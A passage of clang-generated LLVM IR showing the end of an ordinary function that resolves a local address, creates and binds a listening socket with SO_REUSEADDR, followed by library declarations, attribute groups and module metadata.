  %13 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 0
  store i32 1, i32* %13, align 8
  %14 = load i8*, i8** %3, align 8
  %15 = call i32 @getaddrinfo(i8* null, i8* %14, %struct.addrinfo* %4, %struct.addrinfo** %5)
  store i32 %15, i32* %7, align 4
  %16 = load i32, i32* %7, align 4
  %17 = icmp ne i32 %16, 0
  br i1 %17, label %18, label %23

18:                                               ; preds = %1
  %19 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %20 = load i32, i32* %7, align 4
  %21 = call i8* @gai_strerror(i32 %20) #8
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %19, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.136, i64 0, i64 0), i8* %21)
  store i32 -1, i32* %2, align 4
  br label %76

23:                                               ; preds = %1
  %24 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  store %struct.addrinfo* %24, %struct.addrinfo** %6, align 8
  br label %25

25:                                               ; preds = %63, %23
  %26 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %27 = icmp ne %struct.addrinfo* %26, null
  br i1 %27, label %28, label %67

28:                                               ; preds = %25
  %29 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %30 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %29, i32 0, i32 1
  %31 = load i32, i32* %30, align 4
  %32 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %33 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %32, i32 0, i32 2
  %34 = load i32, i32* %33, align 8
  %35 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %36 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %35, i32 0, i32 3
  %37 = load i32, i32* %36, align 4
  %38 = call i32 @socket(i32 %31, i32 %34, i32 %37) #8
  store i32 %38, i32* %8, align 4
  %39 = load i32, i32* %8, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

41:                                               ; preds = %28
  br label %63

42:                                               ; preds = %28
  store i32 1, i32* %9, align 4
  %43 = load i32, i32* %8, align 4
  %44 = bitcast i32* %9 to i8*
  %45 = call i32 @setsockopt(i32 %43, i32 1, i32 2, i8* %44, i32 4) #8
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %47, label %48

47:                                               ; preds = %42
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.137, i64 0, i64 0))
  br label %48

48:                                               ; preds = %47, %42
  %49 = load i32, i32* %8, align 4
  %50 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %51 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %50, i32 0, i32 5
  %52 = load %struct.sockaddr*, %struct.sockaddr** %51, align 8
  %53 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %54 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %53, i32 0, i32 4
  %55 = load i32, i32* %54, align 8
  %56 = call i32 @bind(i32 %49, %struct.sockaddr* %52, i32 %55) #8
  store i32 %56, i32* %7, align 4
  %57 = load i32, i32* %7, align 4
  %58 = icmp eq i32 %57, 0
  br i1 %58, label %59, label %60

59:                                               ; preds = %48
  br label %67

60:                                               ; preds = %48
  %61 = load i32, i32* %8, align 4
  %62 = call i32 @close(i32 %61)
  br label %63

63:                                               ; preds = %60, %41
  %64 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %65 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %64, i32 0, i32 7
  %66 = load %struct.addrinfo*, %struct.addrinfo** %65, align 8
  store %struct.addrinfo* %66, %struct.addrinfo** %6, align 8
  br label %25, !llvm.loop !27

67:                                               ; preds = %59, %25
  %68 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %69 = icmp eq %struct.addrinfo* %68, null
  br i1 %69, label %70, label %73

70:                                               ; preds = %67
  %71 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %72 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %71, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.138, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %76

73:                                               ; preds = %67
  %74 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  call void @freeaddrinfo(%struct.addrinfo* %74) #8
  %75 = load i32, i32* %8, align 4
  store i32 %75, i32* %2, align 4
  br label %76

76:                                               ; preds = %73, %70, %18
  %77 = load i32, i32* %2, align 4
  ret i32 %77
}

; Function Attrs: noreturn nounwind
declare void @abort() #6

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) #2

; Function Attrs: nofree nosync nounwind willreturn
declare i8* @llvm.stacksave() #7

declare i32 @fcntl(i32, i32, ...) #1

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32) #2

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #2

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) #2

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #5 = { argmemonly nofree nounwind willreturn writeonly }
attributes #6 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #7 = { nofree nosync nounwind willreturn }
attributes #8 = { nounwind }
attributes #9 = { nounwind readonly willreturn }
attributes #10 = { nounwind readnone willreturn }
attributes #11 = { noreturn nounwind }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
!20 = distinct !{!20, !7}
!21 = distinct !{!21, !7}
!22 = distinct !{!22, !7}
!23 = distinct !{!23, !7}
!24 = distinct !{!24, !7}
!25 = distinct !{!25, !7}
!26 = distinct !{!26, !7}
!27 = distinct !{!27, !7}
